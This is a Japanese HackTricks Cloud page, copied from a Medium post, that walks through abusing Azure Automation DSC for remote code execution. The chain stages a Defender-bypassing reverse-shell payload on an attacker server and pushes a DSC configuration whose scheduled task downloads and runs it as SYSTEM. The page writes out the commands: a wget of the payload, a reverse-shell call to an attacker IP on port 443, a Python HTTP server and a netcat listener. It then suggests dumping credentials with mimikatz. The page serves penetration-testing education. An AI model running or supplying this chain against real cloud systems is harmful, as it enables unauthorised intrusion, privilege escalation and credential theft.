# Az - State Configuration RCE

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社を宣伝したい**場合や、**PEASSの最新バージョンを見たい**場合、または**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するには、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のgithubリポジトリに送信してください。**

</details>

**この投稿は** [**https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe**](https://medium.com/cepheisecurity/abusing-azure-dsc-remote-code-execution-and-privilege-escalation-ab8c35dd04fe) **からコピーされました**

### リモートサーバー（C2）インフラの準備 <a href="#f0fa" id="f0fa"></a>

私はリモートサーバー「40.84.7.74」でNishangのInvoke-PowerShellTcp.ps1ペイロードの簡略版をホストします。ペイロードの名前は「RevPS.ps1」です。Windows DefenderによってNishangスクリプトが削除されるのを防ぐために（おそらくファイルをディスクにドロップしたい場合もあるかもしれません）、ここに軽量版があります。これはDefenderをバイパスします：[https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/RevPS.ps1)。これはKaliボックス上のシンプルなPython Simple Serverによってホストされます。

### ステップ1 - ファイルの作成 <a href="#89de" id="89de"></a>

別のDSC構成ファイルを作成する必要があります。テンプレートはここからダウンロードできます：[https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/reverse\_shell\_config.ps1)。この構成ファイルは、以前使用したファイル書き込み関数を使用します。今回は、リモートサーバーからペイロードをダウンロードして実行するコードが含まれています。また、_ComputerManagementDsc_モジュールから利用可能なスケジュールされたタスク関数を使用しています。スケジュールされたタスク関数は、後で実行とSYSTEM特権の提供において重要な役割を果たします。

また、VMに構成を公開するために使用されるスクリプトもダウンロードします。これはここにあります：[https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1](https://github.com/nickpupp0/AzureDSCAbuse/blob/master/push\_reverse\_shell\_config.ps1)。

これらのファイルはテンプレートとして機能します。**変数名とパラメータを使用して、必要な情報を入力する必要があります**。これには、リソース名、ファイルパス、および使用している外部サーバー/ペイロードの名前が含まれます。コード内のコメントを参照してください。

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### ステップ2 - 構成ファイルの圧縮 <a href="#c2c2" id="c2c2"></a>

2つのファイルを作成したら、**'reverse\_shell\_config.ps1'**ファイルを圧縮してStorage Accountに送信します。
```
Compress-Archive -Path .\reverse_shell_config.ps1 -DestinationPath .\reverse_shell_config.ps1.zip
```
<figure><img src="../../../../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

### ステップ3 — ストレージコンテキストの設定とアップロード <a href="#bed9" id="bed9"></a>

再び、私たちはストレージアカウントのコンテキストを設定します。すでに行っています。私はすでに「**azure-pentes**t」という名前のコンテナを持っているので、ここに私のものを公開します。
```
Set-AzStorageBlobContent -File "reverse_shell_config.ps1.zip" -Container "azure-pentest" -Blob "reverse_shell_config.ps1.zip" -Context $ctx
```
<figure><img src="../../../../.gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

### ステップ4 — Kaliボックスの準備 <a href="#20fb" id="20fb"></a>

Kaliボックスでは、簡単にPowerShellペイロードを_wget_できます。生の逆シェルスクリプトはここにあります：[https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1](https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1)。
```
wget https://raw.githubusercontent.com/nickpupp0/AzureDSCAbuse/master/RevPS.ps1
```
<figure><img src="../../../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>

逆シェルスクリプトを編集する必要があります。実行されると、Windows VMが接続する先のパラメータを追加します。私の場合、以下を追加します。
```
RevPShell -Reverse 40.84.7.73 443
```
<figure><img src="../../../../.gitbook/assets/image (2) (3).png" alt=""><figcaption></figcaption></figure>

### ステップ5 — 設定ファイルの公開 <a href="#9ad6" id="9ad6"></a>

今、私たちは設定ファイルを実行します。私はビジュアルをより良くするためにデスクトップに公開するように設定していますが、どこにでも公開することができます。数分後、逆シェルスクリプトが公開されたことがわかります！

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### ステップ6 — ペイロードのホストとリスナーの設定 <a href="#c55f" id="c55f"></a>

設定を公開したら、Python SimpleHTTPServerをポート80で同時に起動してペイロードをホストし、接続をキャッチするためにnetcatリスナーも起動できます。
```
sudo python -m SimpleHTTPServer 80sudo nc -nlvp 443
```
スケジュールされたタスクが実行され、私たちのペイロードが取得され、**SYSTEM**レベルの特権で実行されました！

<figure><img src="../../../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

### まとめ <a href="#1ec2" id="1ec2"></a>

これにより、さまざまな可能性が開かれます。**SYSTEM**として実行されるシェルがあるため、mimikatzを使用して資格情報をダンプすることができます（クラウドリソースのEDRの成熟度によっては、リスクがあるかもしれません）。資格情報をダンプすると、これらを他のリソースで再利用する可能性が高くなります。最後に、この設定を1つのVMに制限する代わりに、複数のVMにこの設定を適用する能力があることが大きなポイントです。

以上で、Azure Automation DSCの冒険は終了です！楽しんで学び、独自の創造力を持ち続けることを願っています。

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* **HackTricksのスポンサーになる**ことで、**会社の広告を掲載**したり、**最新版のPEASSを入手**したり、**HackTricksをPDFでダウンロード**したりできます。[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを発見しましょう。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で私をフォローしてください🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **ハッキングのトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>
